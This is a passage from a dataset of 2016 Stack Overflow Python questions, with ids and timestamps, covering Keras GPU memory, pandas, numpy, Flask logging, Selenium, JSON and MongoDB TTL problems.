<li>If you want to test this on your own GPU, you might want to make the network deeper/shallower depending on how much GPU memory you have to test this.</li>
<li>My configuration is as follows: Ubuntu 14.04, GeForce GTX 960, CUDA 7.5.18, CudNN 5.1.3, Python 2.7, Keras 1.1.0 (installed via pip)</li>
<li>I've tried changing the compilation of the model to use different optimizers and losses, but that doesn't seem to change anything.</li>
<li>I've tried changing the train_on_batch function to use fit instead, but it has the same problem.</li>
<li>I saw one similar question here on StackOverflow - <a href=""http://stackoverflow.com/questions/35757151/why-does-this-keras-model-require-over-6gb-of-memory"">Why does this Keras model require over 6GB of memory?</a> - but as far as I can tell, I don't have those issues in my configuration. I've never had multiple versions of CUDA installed, and I've double checked my PATH, LD_LIBRARY_PATH and CUDA_ROOT variables more times than I can count.</li>
<li>Julius suggested that the activation parameters themselves take up GPU memory. If this is true, can somebody explain it a bit more clearly? I have tried changing the activation function of my convolution layers to functions that are clearly hard-coded with no learnable parameters as far as I can tell, and that doesn't change anything. Also, it seems unlikely that these parameters would take up almost as much memory as the rest of the network itself.</li>
<li>After thorough testing, the largest network I can train is about 453 MB of parameters, out of my ~2 GB of GPU RAM. Is this normal? </li>
<li>After testing Keras on some smaller CNNs that do fit in my GPU, I can see that there are very sudden spikes in GPU RAM usage. If I run a network with about 100 MB of parameters, 99% of the time during training it'll be using less than 200 MB of GPU RAM. But every once in a while, memory usage spikes to about 1.3 GB. It seems safe to assume that it's these spikes that are causing my problems. I've never seen these spikes in other frameworks, but they might be there for a good reason? <strong>If anybody knows what causes them, and if there's a way to avoid them, please chime in!</strong></li>
</ul>
"
39925931,6939201.0,2016-10-07 21:17:08+00:00,4,How to avoid to manually set the initial value of a variable in a recursive function?,"<p>I found this solution for the Euler project 5 (What is the smallest positive number that is evenly divisible by all of the numbers from 1 to 20?) with a variable range of integer values to divide evenly by: </p>

<pre><code>def Euler5(start, end, counter):
    x = counter
    while start &lt;= end:
        if x%counter == x%start:
            return Euler5(start+1, end, x)
        else:
            x += counter
    return x
</code></pre>

<p>I do however have to manually set the counter to the smallest integer value (initial <code>counter</code> = <code>start</code> value). Is there a way to automatically do this and to maintain the algorithm?</p>
"
39763436,6618062.0,2016-09-29 06:57:02+00:00,4,apply function on groups of k elements of a pandas Series,"<p>I have a pandas Series:</p>

<pre><code>0     1
1     5
2    20
3    -1
</code></pre>

<p>Lets say I want to apply <code>mean()</code> on every two elements, so I get something like this:</p>

<pre><code>0    3.0
1    9.5
</code></pre>

<p>Is there an elegant way to do this?</p>
"
39591831,5688175.0,2016-09-20 10:31:19+00:00,4,Optimization in scipy from sympy,"<p>I have four functions symbolically computed with Sympy and then lambdified:</p>

<pre><code>deriv_log_s_1 = sym.lambdify((z, m_1, m_2, s_1, s_2), deriv_log_sym_s_1, modules=['numpy', 'sympy'])
deriv_log_s_2 = sym.lambdify((z, m_1, m_2, s_1, s_2), deriv_log_sym_s_2, modules=['numpy', 'sympy'])
deriv_log_m_1 = sym.lambdify((z, m_1, m_2, s_1, s_2), deriv_log_sym_m_1, modules=['numpy', 'sympy'])
deriv_log_m_2 = sym.lambdify((z, m_1, m_2, s_1, s_2), deriv_log_sym_m_2, modules=['numpy', 'sympy'])
</code></pre>

<p>From these functions, I define a cost function to optimize:</p>

<pre><code>def cost_function(x, *args):

    m_1, m_2, s_1, s_2 = x     

    print(args[0])    

    T1 = np.sum([deriv_log_m_1(y, m_1, m_2, s_1, s_2) for y in args[0]])   
    T2 = np.sum([deriv_log_m_2(y, m_1, m_2, s_1, s_2) for y in args[0]]) 


    T3 = np.sum([deriv_log_m_1(y, m_1, m_2, s_1, s_2) for y in args[0]])   
    T4 = np.sum([deriv_log_m_1(y, m_1, m_2, s_1, s_2) for y in args[0]])   

    return T1 + T2 + T3 + T4
</code></pre>

<p>My function <code>cost_function</code> works as expected:    </p>

<pre><code>a = 48.7161
b = 16.3156
c = 17.0882
d = 7.0556
z = [0.5, 1, 2, 1.2, 3]

test = cost_function(np.array([a, b, c, d]).astype(np.float32), z)
</code></pre>

<p>However, when I try to optimize it:</p>

<pre><code>from scipy.optimize import fmin_powell

res = fmin_powell(cost_function, x0=np.array([a, b, c, d], dtype=np.float32), args=(z, ))
</code></pre>

<p>It raises the following error:</p>

<pre><code>AttributeError: 'Float' object has no attribute 'sqrt'
</code></pre>

<p>I do not understand why such an error appears as my <code>cost_function</code> alone does not raise any error.</p>
"
39646236,322909.0,2016-09-22 18:20:56+00:00,4,Why does logging not work when running a Flask app with werkzeug?,"<p>So here is a copy paste example that reproduces the problem.</p>

<pre><code>import logging

from flask import Flask
from werkzeug.serving import run_simple
from werkzeug.wsgi import DispatcherMiddleware

def app_builder(app_name, log_file):

    app = Flask(app_name)
    app.debug = True

    handler = logging.FileHandler(log_file)
    handler.setLevel(logging.DEBUG)
    app.logger.addHandler(handler)

    return app

def _simple(env, resp):
    resp(b'200 OK', [(b'Content-Type', b'text/plain')])
    return [b'root']

if __name__ == ""__main__"":

    app = app_builder(app_name='app', log_file='app.log')

    @app.route('/')
    def index():
        return '&lt;a href=""/app/error""&gt;click for error&lt;/a&gt;'

    @app.route('/error')
    def error():
        1/0
        return 'error page'

    app2 = app_builder(app_name='app2', log_file='app2.log')

    @app2.route('/')
    def index():
        return 'you are getting responses from app2'

    app.debug = True
    app2.debug = True

    application = DispatcherMiddleware(_simple, {
        '/app':     app,
        '/app2':    app2
        })

    run_simple(hostname='localhost',
               port=5000,
               application=application,
               use_reloader=True,
               use_debugger=True)
</code></pre>

<p>To make an error show up navigate to <code>http://localhost:5000/app/error</code>, I want to know why the stack trace doesn't show up in the <code>app.log</code> file. I assume that the <code>DispatcherMiddleware</code> or <code>run_simple</code> are somehow catching the exception before it can be logged. If I run only the <code>app</code> instance using <code>app.run()</code> the error logging works fine.</p>
"
39733269,6890001.0,2016-09-27 19:57:47+00:00,4,Beginner : python len() closes file?,"<p>I am new to Python and going through the book of Zed. I stumbled upon the following exercise, scope of which is to copy one txt to another.</p>

<p>The original code from the book <em>works perfectly</em> and I copy below - so that I can show the difference:</p>

<pre><code>1 from sys import argv
2 from os.path import exists
3
4 script, from_file, to_file = argv
5
6 print ""Copying from %s to %s"" % (from_file, to_file)
7
8 # we could do these two on one line too, how?
9 in_file = open(from_file)
10 indata = in_file.read()
11
12 print ""The input file is %d bytes long"" % len(indata)
13
14 print ""Does the output file exist? %r"" % exists(to_file)
15 print ""Ready, hit RETURN to continue, CTRL- C to abort.""
16 raw_input()
17
18 out_file = open(to_file, 'w')
19 out_file.write(indata)
20
21 print ""Alright, all done.""
22
23 out_file.close()
24 in_file.close()
</code></pre>

<p>What I decided to do, is to avoid having a variable <strong>in_file</strong> AND <strong>indata</strong> so I did some changes in lines 9-10, 12 and 19 and wrote the following code:</p>

<pre><code>from sys import argv
from os.path import exists

script, from_file, to_file = argv

print ""Copying from %s to %s"" % (from_file, to_file)

# we could do these two on one line too, how?
in_file = open(from_file)


print ""The input file is %d bytes long"" % len(in_file.read())

print ""Does the output file exist? %r"" % exists(to_file)
print ""Ready, hit RETURN to continue, CTRL- C to abort.""
raw_input()

out_file = open(to_file, 'w')
out_file.write(in_file.read())

print ""Alright, all done.""

out_file.close()
in_file.close()
</code></pre>

<p>My problem is:</p>

<p>1) As written the <strong>amended</strong> code, althouhg it prints correctly the bytes of the in_file.read(), it never copies the text from the from_file to the to_file</p>

<p>2) If in the <strong>amended</strong> I ommit only the line which counts the bytes - so the len() function - then it copies normally the one file to the other . </p>

<p>From my understanding, by evoking the len() function it then closes the in_file.</p>

<p>Is my thought correct? Can I avoid that, by not having to repeat the code in_file = open(from_file)? What else could be the reason?</p>

<p>I would appreciate the help, because this drives me a bit nuts :)</p>
"
40084931,900683.0,2016-10-17 11:12:49+00:00,4,Taking subarrays from numpy array with given stride,"<p>Lets say I have a Python Numpy array array a.</p>

<pre><code>numpy.array([1,2,3,4,5,6,7,8,9,10,11].)
</code></pre>

<p>I want to create a matrix of sub sequences from this array of length 5 with stride 3. The results matrix hence will look as follows:</p>

<pre><code>numpy.array([[1,2,3,4,5],[4,5,6,7,8],[7,8,9,10,11]])
</code></pre>

<p>One possible way of implementing this would be using a for-loop.</p>

<pre><code>result_matrix = np.zeros((3, 5))
for i in range(0, len(a), 3):
  result_matrix[i] = a[i:i+5]
</code></pre>

<p>Is there a cleaner way to implement this is Numpy?</p>
"
39664058,244297.0,2016-09-23 15:08:19+00:00,4,Is there any equivalent to the Perl regexes' \K backslash sequence in Python?,"<p>Perl's regular expressions have the <a href=""http://perldoc.perl.org/perlrebackslash.html#Misc"" rel=""nofollow""><code>\K</code></a> backslash sequence:</p>

<blockquote>
  <p><strong>\K</strong><br>
  This appeared in perl 5.10.0. Anything matched left of <code>\K</code> is not
  included in <code>$&amp;</code>, and will not be replaced if the pattern is used in a
  substitution. This lets you write <code>s/PAT1 \K PAT2/REPL/x</code> instead of
  <code>s/(PAT1) PAT2/${1}REPL/x</code> or <code>s/(?&lt;=PAT1) PAT2/REPL/x</code>.</p>
  
  <p>Mnemonic: <em>Keep</em>.</p>
</blockquote>

<p>Is there anything equivalent in Python?</p>
"
39882645,651174.0,2016-10-05 19:57:26+00:00,4,How to grab headers in python selenium-webdriver,"<p>I am trying to grab the headers in selenium webdriver. Something similar to the following:</p>

<pre><code>&gt;&gt;&gt; import requests
&gt;&gt;&gt; res=requests.get('http://google.com')
&gt;&gt;&gt; print res.headers
</code></pre>

<p>I need to use the <code>Chrome</code> webdriver because it supports flash and some other things that I need to test a web page. Here is what I have so far in Selenium:</p>

<pre><code>from selenium import webdriver
driver = webdriver.Chrome()
driver.get('https://login.comcast.net/login?r=comcast.net&amp;s=oauth&amp;continue=https%3A%2F%2Flogin.comcast.net%2Foauth%2Fauthorize%3Fclient_id%3Dxtv-account-selector%26redirect_uri%3Dhttps%3A%2F%2Fxtv-pil.xfinity.com%2Fxtv-authn%2Fxfinity-cb%26response_type%3Dcode%26scope%3Dopenid%2520https%3A%2F%2Flogin.comcast.net%2Fapi%2Flogin%26state%3Dhttps%3A%2F%2Ftv.xfinity.com%2Fpartner-success.html%26prompt%3Dlogin%26response%3D1&amp;reqId=18737431-624b-44cb-adf0-2a85d91bd662&amp;forceAuthn=1&amp;client_id=xtv-account-selector')
driver.find_element_by_css_selector('#user').send_keys('XY@comcast.net')
driver.find_element_by_css_selector('#passwd').send_keys('XXY')
driver.find_element_by_css_selector('#passwd').submit()
print driver.headers ### How to do this?
</code></pre>

<p>I have seen some other answers that recommend running an entire selenium server to get this information (<a href=""https://github.com/derekargueta/selenium-profiler"" rel=""nofollow"">https://github.com/derekargueta/selenium-profiler</a>). How would I get it using something similar to the above with Webdriver?</p>
"
40034570,7017032.0,2016-10-14 03:40:57+00:00,4,Requiring tensorflow with Python 2.7.11 occurs ImportError,"<p>I tried <code>pip install tensorflow</code> on OS X El Capitan and it succeeded.
However, if I tried to import tensorflow, ImportError occured.
Please tell me when you know.</p>

<pre><code>&gt;&gt;&gt; import tensorflow
Traceback (most recent call last):
File ""&lt;stdin&gt;"", line 1, in &lt;module&gt;
File ""/usr/local/lib/python2.7/site-packages/tensorflow/__init__.py"", line 23, in &lt;module&gt;
from tensorflow.python import *
File ""/usr/local/lib/python2.7/site-packages/tensorflow/python/__init__.py"", line 49, in &lt;module&gt;
from tensorflow.python import pywrap_tensorflow
File ""/usr/local/lib/python2.7/site-packages/tensorflow/python/pywrap_tensorflow.py"", line 28, in &lt;module&gt;
_pywrap_tensorflow = swig_import_helper()
File ""/usr/local/lib/python2.7/site-packages/tensorflow/python/pywrap_tensorflow.py"", line 24, in swig_import_helper
_mod = imp.load_module('_pywrap_tensorflow', fp, pathname, description)
ImportError: dlopen(/usr/local/lib/python2.7/site-packages/tensorflow/python/_pywrap_tensorflow.so, 10): no suitable image found.  Did find:
/usr/local/lib/python2.7/site-packages/tensorflow/python/_pywrap_tensorflow.so: unknown file type, first eight bytes: 0x7F 0x45 0x4C 0x46 0x02 0x01 0x01 0x03
&gt;&gt;&gt;   
</code></pre>

<hr>
"
39914524,3370121.0,2016-10-07 09:59:49+00:00,4,indent is broken after saving back updated json dict to file,"<p>I have a nested dictionary with many items in a json file:</p>

<pre><code>{
""Create Code For Animals"": {
    ""mammals"": {
        ""dog"": {
            ""color"": ""brown"", 
            ""name"": ""John"", 
            ""legs"": ""four"", 
            ""tail"": ""yes""
        },
        ""cat"": {
            ""color"": ""blue"", 
            ""name"": ""Johnny"", 
            ""legs"": ""four"", 
            ""tail"": ""yes""
        },
        ""donkey"": {
            ""color"": ""grey"", 
            ""name"": ""Mickey"", 
            ""legs"": ""four"", 
            ""tail"": ""yes""
        }
</code></pre>

<p>I want to replace the name in each one of the animals, then save it back to the file, <strong>AND</strong> keep the indent as it was (as shown).
I'm using the following 2 methods for loading and dumping the original and updated dictionary. </p>

<p>All is working well (for changing the value and saving it back to the file) except the indent (format) of the lines is ruined after saving the file and the file is saved as one long line (with '\n' shown after the updated value). </p>

<p>I've tried using 'pickle' (as seen in one of the posts here), but this didn't work, made a mess of all the data in the file. </p>

<pre><code>    def loadJson(self, jsonFilename):
        with open(FILE_PATH + '\\' + jsonFilename, 'r') as f:
           return json.load(f)

    def writeJson(self, jsonFilename, jsonDict):
        with open(FILE_PATH + '\\' + jsonFilename, 'w') as f:
           return json.dump(jsonDict, f)          
</code></pre>

<p>Any help will do. </p>
"
39997334,5082463.0,2016-10-12 11:22:54+00:00,4,is_max = s == s.max() | How should I read this?,"<p>While studying <a href=""http://pandas.pydata.org/pandas-docs/stable/style.html"" rel=""nofollow"">Pandas Style</a>, I got to the following:</p>

<pre><code>def highlight_max(s):
    '''
    highlight the maximum in a Series yellow.
    '''
    is_max = s == s.max()
    return ['background-color: yellow' if v else '' for v in is_max]
</code></pre>

<p>How should I read <code>is_max = s == s.max()</code>?</p>
"
40091996,3130926.0,2016-10-17 17:06:58+00:00,4,pandas transpose numeric column by group,"<p>code to make test data</p>

<pre><code>import pandas as pd

dftest = pd.DataFrame({'Amt': {0: 60, 1: 35.0, 2: 30.0, 3: np.nan, 4: 25},
                       'Year': {0: 2012.0, 1: 2012.0, 2: 2012.0, 3: 2013.0, 4: 2013.0},
                       'Name': {0: 'A', 1: 'A', 2: 'C', 3: 'A', 4: 'B'}})
</code></pre>

<p>gives</p>

<pre><code>    Amt     Name    Year
0   60        A   2012.0
1   35.0      A   2012.0
2   30.0      C   2012.0
3   NaN       A   2013.0
4   25        B   2013.0
</code></pre>

<p>column <code>Amt</code> has max 2 values corresponding to group <code>['Name', 'Year']</code>. I would like to pivot/transpose such that output is of the form</p>

<pre><code>       Name  Year   Amt1  Amt2
0         A  2012   35    60
2         C  2012   30    NaN
3         A  2013   NaN   NaN
4         B  2013   25    NaN
</code></pre>

<p>I have tried playing with pivot, unstack, pivot_table </p>

<p>what I really want to do is to ensure there are two values of <code>Amt</code> per <code>['Name', 'Year']</code> (<code>NA</code>'s are OK), which I can achieve by stacking the desired output</p>
"
40006169,5959753.0,2016-10-12 18:47:04+00:00,4,Can this python function be vectorized?,"<p>I have been working on this function that generates some parameters I need for a simulation code I am developing and have hit a wall with enhancing its performance.</p>

<p>Profiling the code shows that this is the main bottleneck so any enhancements I can make to it however minor would be great.</p>

<p>I wanted to try to vectorize parts of this function but I am not sure if it is possible.</p>

<p>The main challenge is that the parameters that get stored in my array <code>params</code> depends upon the indices of params. The only straightforward solution to this I saw was using <code>np.ndenumerate</code>, but this seems to be pretty slow. </p>

<p>Is it possible to vectorize this type of operation where the values stored in the array depend upon where they are being stored? Or would it be smarter/faster to create a generator that would just give me the tuples of the array indices?</p>

<pre><code>import numpy as np
from scipy.sparse import linalg as LA

def get_params(num_bonds, energies):
    """"""
    Returns the interaction parameters of different pairs of atoms.

    Parameters
    ----------
    num_bonds : ndarray, shape = (M, 20)
        Sparse array containing the number of nearest neighbor bonds for 
        different pairs of atoms (denoted by their column) and next-
        nearest neighbor bonds. Columns 0-9 contain nearest neighbors, 
        10-19 contain next-nearest neighbors

    energies : ndarray, shape = (M, )
        Energy vector corresponding to each atomic system stored in each 
        row of num_bonds.
    """"""

    # -- Compute the bond energies
    x = LA.lsqr(num_bonds, energies, show=False)[0]

    params = np.zeros([4, 4, 4, 4, 4, 4, 4, 4, 4])

    nn = {(0,0): x[0], (1,1): x[1], (2,2): x[2], (3,3): x[3], (0,1): x[4],
          (1,0): x[4], (0,2): x[5], (2,0): x[5], (0,3): x[6], (3,0): x[6],
          (1,2): x[7], (2,1): x[7], (1,3): x[8], (3,1): x[8], (2,3): x[9],
          (3,2): x[9]}

    nnn = {(0,0): x[10], (1,1): x[11], (2,2): x[12], (3,3): x[13], (0,1): x[14],
           (1,0): x[14], (0,2): x[15], (2,0): x[15], (0,3): x[16], (3,0): x[16],
           (1,2): x[17], (2,1): x[17], (1,3): x[18], (3,1): x[18], (2,3): x[19],
           (3,2): x[19]}

    """"""
    params contains the energy contribution of each site due to its
    local environment. The shape is given by the number of possible atom
    types and the number of sites in the lattice.
    """"""
    for (i,j,k,l,m,jj,kk,ll,mm), val in np.ndenumerate(params):

        params[i,j,k,l,m,jj,kk,ll,mm] = nn[(i,j)] + nn[(i,k)] + nn[(i,l)] + \
                                        nn[(i,m)] + nnn[(i,jj)] + \
                                        nnn[(i,kk)] + nnn[(i,ll)] + nnn[(i,mm)]

return np.ascontiguousarray(params)
</code></pre>
"
39892460,6930959.0,2016-10-06 09:33:21+00:00,4,Obtain the difference between two files,"<p><em>First of all, i searched on the web and stackoverflow for around 3 days and haven't found anything i've been looking for.</em></p>

<p>I am doing a weekly security audit where i get back a .csv file with the IPs and the open ports. They look like this:</p>

<p><strong>20160929.csv</strong></p>

<pre><code>10.4.0.23;22
10.12.7.8;23
10.18.3.192;23
</code></pre>

<p><strong>20161006.csv</strong></p>

<pre><code>10.4.0.23;22
10.18.3.192;23
10.24.0.2;22
10.75.1.0;23
</code></pre>

<p>The difference is:
<strong>10.12.7.8:23</strong> got closed.
<strong>10.24.0.2:22</strong> and <strong>10.75.1.0:23</strong> got opened.</p>

<p>I want a script which prints me out:</p>

<pre><code>[-] 10.12.7.8:23
[+] 10.24.0.2:22
[+] 10.75.1.0:23
</code></pre>

<p><strong>How can i make a script like this?</strong> I tried my difflib but that isn't what i need. I need to be able to also write that to files later or send that output as a mail which i have a script for already.</p>

<p>I can't use Unix, because in our company we have a Windows environment and are not allowed to use another OS. So i can't use <code>diff</code> or some other great tools.</p>

<p>This is my first attempt:</p>

<pre><code>old = set((line.strip() for line in open('1.txt', 'r+')))
new = open('2.txt', 'r+')
diff = open('diff.txt', 'w')

for line in new:
    if line.strip() not in old:
        diff.write(line)
new.close()
diff.close()
</code></pre>

<p>This is my second attempt</p>

<pre><code>old = set((line.strip() for line in open('1.txt', 'r+')))
new = open('2.txt', 'r+')
diff = open('diff.txt', 'w')

for line in new:
    if line.strip() not in old:
        diff.write(line)
new.close()
diff.close()
</code></pre>
"
39922986,1027427.0,2016-10-07 17:36:25+00:00,4,Pandas group-by and sum,"<p>I am using this data frame:</p>

<pre><code>Fruit   Date    Name    Number
Apples  10/6/2016   Bob 7
Apples  10/6/2016   Bob 8
Apples  10/6/2016   Mike    9
Apples  10/7/2016   Steve   10
Apples  10/7/2016   Bob 1
Oranges 10/7/2016   Bob 2
Oranges 10/6/2016   Tom 15
Oranges 10/6/2016   Mike    57
Oranges 10/6/2016   Bob 65
Oranges 10/7/2016   Tony    1
Grapes  10/7/2016   Bob 1
Grapes  10/7/2016   Tom 87
Grapes  10/7/2016   Bob 22
Grapes  10/7/2016   Bob 12
Grapes  10/7/2016   Tony    15
</code></pre>

<p>I want to aggregate this by name and then by fruit to get a total number of fruit per name.</p>

<pre><code>Bob,Apples,16 ( for example )
</code></pre>

<p>I tried grouping by Name and Fruit but how do I get the total number of fruit.</p>
"
39773480,4541216.0,2016-09-29 14:47:21+00:00,4,python pandas/numpy quick way of replacing all values according to a mapping scheme,"<p>let's say I have a huge panda data frame/numpy array where each element is a list of ordered values:</p>

<pre><code>sequences = np.array([12431253, 123412531, 12341234,12431253, 145345],
                     [5463456, 1244562, 23452],
                     [243524, 141234,12431253, 456367], 
                     [456345, 253451], 
                     [75635, 14145, 12346,12431253])
</code></pre>

<p>or,</p>

<pre><code>sequences = pd.DataFrame({'sequence': [[12431253, 123412531, 12341234,12431253, 145345],
                                      [5463456, 1244562, 23452],
                                      [243524, 141234, 456367,12431253],
                                      [456345, 253451],
                                      [75635, 14145, 12346,12431253]]})
</code></pre>

<p>and I want to replace them with another set of identifiers that start from 0, so I design a mapping like this:</p>

<pre><code>from compiler.ast import flatten
from sets import Set
mapping = pd.DataFrame({'v0': list(Set(flatten(sequences['sequence']))), 'v1': range(len(Set(flatten(sequences['sequence'])))})
</code></pre>

<p>......</p>

<p>so the result I was looking for:</p>

<pre><code>sequences = np.array([1, 2, 3,1, 4], [5, 6, 7], [8, 9, 10,1], [11, 12], [13, 14, 15,1])
</code></pre>

<p>how can I scale this up to a huge data frame/numpy of sequences ?</p>

<p>Thanks so much for any guidance! Greatly appreciated!</p>
"
39737300,6502221.0,2016-09-28 02:55:12+00:00,4,Return string that is not a substring of other strings - is it possible in time less than O(n^2)?,"<p>You are given an array of strings. you have to return only those strings that are not sub strings of other strings in the array.
Input - <code>['abc','abcd','ab','def','efgd']</code>.
Output should be - <code>'abcd'</code> and <code>'efgd'</code>
I have come up with a solution in python that has time complexity O(n^2).
Is there a possible solution that gives a lesser time complexity?
My solution:</p>

<pre><code>def sub(l,s):
  l1=l
  for i in range (len(l)):
        l1[i]=''.join(sorted(l1[i]))
  for i in l1:      
         if s in i:
              return True
  return False

def main(l):
      for i in range(len(l)):
            if sub(l[0:i-1]+l[i+1:],l[i])==False:
                  print l[i]


main(['abc','abcd','ab','def','efgd'])                  
</code></pre>
"
40039156,322229.0,2016-10-14 09:03:46+00:00,4,How to determine the number of interned strings in Python 2.7.5?,"<p>In an earlier version of Python (I don't remember which), calling <code>gc.get_referrers</code> on an arbitrary interned string could be used to obtain a reference to the <code>interned</code> dict, which could then be queried for its length.</p>

<p>But this is no longer working in Python 2.7.5: <code>gc.get_referrers(...)</code> no longer includes the <code>interned</code> dict in the list it returns.</p>

<p>Is there any other way, in Python 2.7.5, to determine the number of interned strings?  If so, how?</p>
"
39899580,1459533.0,2016-10-06 15:07:54+00:00,4,Float value behaviour in Python 2.6 and Python 2.7,"<p>I have to convert string to tuple of float.
In Python 2.7, it gives correct conversion, but in Python it is not same case.</p>

<p>I want same behaviour in Python 2.6 </p>

<p>Can anyone help me why this is not same in Python 2.6 and how to do in Python 2.6.</p>

<p><strong>Python 2.6</strong></p>

<pre><code>&gt;&gt;&gt; a
'60.000,494.100,361.600,553.494'
&gt;&gt;&gt; eval(a)
(60.0, 494.10000000000002, 361.60000000000002, 553.49400000000003)
&gt;&gt;&gt; import ast
&gt;&gt;&gt; ast.literal_eval(a)
(60.0, 494.10000000000002, 361.60000000000002, 553.49400000000003)
&gt;&gt;&gt; 

&gt;&gt;&gt; for i in a.split("",""):
...   float(i)
... 
60.0
494.10000000000002
361.60000000000002
553.49400000000003
&gt;&gt;&gt; 
</code></pre>

<p><strong>Python 2.7</strong></p>

<pre><code>&gt;&gt;&gt; a
'60.000,494.100,361.600,553.494'
&gt;&gt;&gt; eval(a)
(60.0, 494.1, 361.6, 553.494)
&gt;&gt;&gt; import ast
&gt;&gt;&gt; ast.literal_eval(a)
(60.0, 494.1, 361.6, 553.494)
&gt;&gt;&gt; 

&gt;&gt;&gt; for i in a.split("",""):
...   float(i)
... 
60.0
494.1
361.6
553.494
</code></pre>

<p>Its not look good</p>

<p><strong>[Edit 2]</strong></p>

<p><strong>I just print value and condition</strong></p>

<pre><code>print fGalleyTopRightOddX, ""&gt;="", tLinetextBbox[2], fGalleyTopRightOddX&gt;=tLinetextBbox[2]

361.6 &gt;= 361.6 False
</code></pre>

<p>I calculate <code>tLinetextBbox</code> value from string and which is <code>361.60000000000002</code> and <code>fGalleyTopRightOddX</code> value is <code>361.6</code></p>

<p>I am working on <strong>Python Django</strong> project where <strong>apache</strong> is server.</p>

<ol>
<li><code>fGalleyTopRightOddX</code> i.e. <code>361.6</code> is calculated in apache environment</li>
<li><code>tLinetextBbox</code> i.e. <code>361.60000000000002</code> is calculated on cmd means I pass <code>fGalleyTopRightOddX</code> to program which run by command <code>line os.system</code></li>
</ol>

<p><strong>[Edit 3]</strong>
Just one more information,</p>

<p>when I log diction in text file then i get <code>tLinetextBbox</code> vale as <code>361.59999999999997</code></p>
"
39768934,6899126.0,2016-09-29 11:24:01+00:00,4,Mongo TTL cleanup is not working,"<p>I'm trying to get Mongo to remove documents with the TTL feature however without success. Have tried many things but mongo doesn't seem to clean up.</p>

<p>My index:</p>

<pre><code>    {
    ""v"" : 1,
    ""key"" : {
        ""date"" : 1
    },
    ""name"" : ""date_1"",
    ""ns"" : ""history.history"",
    ""expireAfterSeconds"" : 60
}
</code></pre>

<p>The date value from document:</p>

<pre><code>       ""date"" : ""2016-09-29 11:08:46.461207"",
</code></pre>

<p>Output from db.serverStatus().metrics.ttl:</p>

<pre><code>{ ""deletedDocuments"" : NumberLong(0), ""passes"" : NumberLong(29) }
</code></pre>

<p>Time output from db.serverStatus():</p>

<pre><code>""localTime"" : ISODate(""2016-09-29T11:19:45.345Z"")
</code></pre>

<p>Only thing I suspect is the way I insert the value from Python. Could be that it's in some way wrong. I have a JSON document which contains the following element:</p>

<pre><code>""date"": str(datetime.utcnow()), 
</code></pre>

<p>Any clues where the problem might lay?</p>

<p>Thanks,
Janis </p>
"
39782108,1502586.0,2016-09-30 00:55:38+00:00,4,Computing aggregate by creating nested dictionary on the fly,"<p>I'm new to python and I could really use your help and guidance at the moment. I am trying to read a csv file with three cols and do some computation based on the first and second column i.e.</p>

<pre><code>A   spent   100     A   spent   2040
A   earned  60
B   earned  48
B   earned  180
A   spent   40
.
.
.
</code></pre>

<p>Where A spent 2040 would be the addition of all 'A' and 'spent' amounts. This does not give me an error but it's not logically correct:</p>

<pre><code>for row in rows:
    cols = row.split("","")
    truck = cols[0]
    if (truck != 'A' and truck != 'B'):
        continue
    record = cols[1]
    if(record != ""earned"" and record != ""spent""):
        continue
    amount = int(cols[2])
    #print(truck+"" ""+record+"" ""+str(amount))

    if truck in entries:
        #entriesA[truck].update(record)
        if record in records:
            records[record].append(amount)
        else:
            records[record] = [amount]
    else:
        entries[truck] = records
        if record in records:
            records[record].append(amount)
        else:
            entries[truck][record] = [amount]
print(entries)
</code></pre>

<p>I am aware that this part is incorrect because I would be adding the same inner dictionary list to the outer dictionary but I'm not sure how to go from there:</p>

<pre><code>entries[truck] = records
if record in records:
    records[record].append(amount)
</code></pre>

<p>However, Im not sure of the syntax to create a new dictionary on the fly that would not be 'records'</p>

<p>I am getting:</p>

<pre><code>{'B': {'earned': [60, 48], 'spent': [100]}, 'A': {'earned': [60, 48], 'spent': [100]}}
</code></pre>

<p>But hoping to get:</p>

<pre><code>{'B': {'earned': [48]}, 'A': {'earned': [60], 'spent': [100]}}
</code></pre>

<p>Thanks.</p>
"
40140942,2356181.0,2016-10-19 20:27:52+00:00,4,Numpy: How to vectorize parameters of a functional form of a function applied to a data set,"<p>Ultimately, I want to remove all explicit loops in the code below to take advantage of numpy vectorization and function calls in C instead of python.</p>

<p>Below is simplified for uses of numpy in python.
I have the following quadratic function:</p>

<pre><code>def quadratic_func(a,b,c,x):
    return a*x*x + b*x + c
</code></pre>

<p>I am trying to optimize choices of a,b,c given input data x and output data y of the same size (of course, this should be done by linear regression...but humor me). Say len(x)=100.  Easy to vectorize with scalars a,b,c to get back a result of length 100.</p>

<p>Let's say that we know a,b,c should be inside of [-10,10] and I optimize by building a grid and picking the point with the min sum square error.</p>

<pre><code>a=np.arange(-10.0, 10.01, 2.0)
nodes=np.array(np.meshgrid(a,a,a)).T.reshape(-1,3) #3-d cartesian product with array of nodes
</code></pre>

<p>For each of the 1331 nodes, I would like to calculate all 1331 of the length 100 return values. </p>

<pre><code>res=[]
x=np.random.uniform(-5.0,5.0, 100)
for node in nodes:
    res.append(quadratic_func(*node, x=x))
</code></pre>

<p>How can I take advantage of broadcasting so as to get my list of 1331 items each with 100 values that are the results of calling quadratic_func on x?  Answer must use vectorization, broadcasting, etc to get the orders of magnitude speed improvements I am looking for.  Also, the answer must use calls to quadratic_func - or more generally, my_func(*node, x=x).</p>

<p>In real life I am optimizing a non-linear function that is not even close to being convex and has many local minimums.  It is a great functional form to use if I can get to the ""right"" local minimum - I already know how to do that, but would like to get there faster!</p>
"
39901833,2445636.0,2016-10-06 17:03:38+00:00,4,Assigning float as a dictionary key changes its precision (Python),"<p>I have a list of floats (actually it's a pandas Series object, if it changes anything) which looks like this:</p>

<pre><code>mySeries:

...
22      16.0
23      14.0
24      12.0
25      10.0
26       3.1
...
</code></pre>

<p>(So elements of this Series are on the right, indices on the left.) Then I'm trying to assign the elements from this Series as keys in a dictionary, and indices as values, like this:</p>

<pre><code>{ mySeries[i]: i for i in mySeries.index }
</code></pre>

<p>and I'm getting pretty much what I wanted, except that...</p>

<pre><code>{ 6400.0: 0, 66.0: 13, 3.1000000000000001: 23, 133.0: 10, ... }
</code></pre>

<p>Why has <code>3.1</code> suddenly changed into <code>3.1000000000000001</code>? I guess this has something to do with the way the floating point numbers are represented (?) but why does it happen <em>now</em> and how do I avoid/fix it?</p>

<p><strong>EDIT:</strong> Please feel free to suggest a better title for this question if it's inaccurate.</p>

<p><strong>EDIT2:</strong> Ok, so it seems that it's the exact same number, just <em>printed</em> differently. Still, if I assign <code>mySeries[26]</code> as a dictionary key and then I try to run:</p>

<pre><code>myDict[mySeries[26]]
</code></pre>

<p>I get <code>KeyError</code>. What's the best way to avoid it?</p>
"
